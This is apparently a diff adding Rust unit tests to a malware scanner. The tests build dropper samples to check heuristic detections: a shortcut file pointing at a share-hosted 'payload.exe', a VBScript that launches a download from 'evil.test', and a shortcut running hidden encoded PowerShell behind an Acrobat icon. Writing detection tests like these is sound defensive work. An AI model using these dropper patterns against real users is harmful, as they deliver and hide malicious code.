+        link_info.extend_from_slice(&0u32.to_le_bytes()); // DeviceNameOffset = 0
+        link_info.extend_from_slice(&0u32.to_le_bytes()); // NetworkProviderType
+        link_info.extend_from_slice(share);
+        let cps_off = link_info.len() as u32;
+        link_info[24..28].copy_from_slice(&cps_off.to_le_bytes());
+        link_info.extend_from_slice(b"stage2\\payload.exe\0");
+        let total_info_len = link_info.len() as u32;
+        link_info[0..4].copy_from_slice(&total_info_len.to_le_bytes());
+        unc_lnk.extend_from_slice(&link_info);
+
+        let unc_det = scan_buffer_layers("share.lnk", "share.lnk", &unc_lnk, "d3", 0, false);
+        assert_eq!(
+            unc_det.map(|d| d.threat_name).as_deref(),
+            Some("Heur.LNK.MaliciousShortcutDropper")
+        );
+
+        let motw_vbs = b"Set sh = CreateObject(\"WScript.Shell\"): sh.Run \"https://evil.test/p.exe\"";
+        let motw_det = evaluate_motw_payload_risk("C:\\Downloads\\drop.vbs", "drop.vbs", motw_vbs, "ee", 4.1);
+        assert_eq!(
+            motw_det.map(|d| d.threat_name).as_deref(),
+            Some("Heur.MotW.InternetScriptDropper")
+        );
+
+        #[cfg(target_os = "windows")]
+        {
+            let tmp_vbs = std::env::temp_dir().join(format!("gs_motw_test_{}.vbs", uuid::Uuid::new_v4()));
+            std::fs::write(&tmp_vbs, motw_vbs).unwrap();
+            let ads_path = format!("{}:Zone.Identifier", tmp_vbs.to_string_lossy());
+            if std::fs::write(&ads_path, "[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=https://evil.test/drop.vbs\r\n").is_ok() {
+                assert!(super::has_internet_motw(&tmp_vbs));
+                let fast_det = super::scan_single_file_fast(&tmp_vbs);
+                assert_eq!(
+                    fast_det.map(|d| d.threat_name).as_deref(),
+                    Some("Heur.MotW.InternetScriptDropper")
+                );
+            }
+            let _ = std::fs::remove_file(&tmp_vbs);
+
+            // Generate real Windows Shell Link (.lnk) files via WScript.Shell COM to verify full MS-SHLLINK parsing
+            let real_mal_lnk = std::env::temp_dir().join(format!("gs_real_mal_{}.lnk", uuid::Uuid::new_v4()));
+            let real_benign_lnk = std::env::temp_dir().join(format!("gs_real_benign_{}.lnk", uuid::Uuid::new_v4()));
+            let ps_script = format!(
+                "$ws = New-Object -ComObject WScript.Shell; \
+                 $s1 = $ws.CreateShortcut('{}'); \
+                 $s1.TargetPath = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'; \
+                 $s1.Arguments = '-NoP -W Hidden -Enc SQBFAFgA'; \
+                 $s1.IconLocation = 'C:\\Program Files\\Adobe\\Acrobat.exe,0'; \
+                 $s1.Save(); \
+                 $s2 = $ws.CreateShortcut('{}'); \
+                 $s2.TargetPath = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'; \
+                 $s2.Arguments = '-File C:\\Scripts\\build.ps1 -Encoding utf8'; \
+                 $s2.Save();",
+                real_mal_lnk.to_string_lossy().replace('\'', "''"),
+                real_benign_lnk.to_string_lossy().replace('\'', "''")
+            );
+            let ps_out = std::process::Command::new("powershell")
+                .args(["-NoProfile", "-NonInteractive", "-Command", &ps_script])
+                .output()
+                .expect("powershell must be invocable on Windows test host");
+            assert!(
+                ps_out.status.success() && real_mal_lnk.exists() && real_benign_lnk.exists(),
+                "WScript.Shell COM shortcut creation must succeed on Windows"
+            );
+            let mal_res = super::scan_single_file_fast(&real_mal_lnk);
+            assert_eq!(
+                mal_res.map(|d| d.threat_name).as_deref(),
+                Some("Heur.LNK.MaliciousShortcutDropper"),
+                "Real WScript.Shell malicious .lnk must be detected"
+            );
+            let benign_res = super::scan_single_file_fast(&real_benign_lnk);
+            assert!(
+                benign_res.is_none(),
+                "Real WScript.Shell benign .lnk with -Encoding utf8 must be clean"
+            );
+            let _ = std::fs::remove_file(&real_mal_lnk);
+            let _ = std::fs::remove_file(&real_benign_lnk);
+        }
+    }
 }
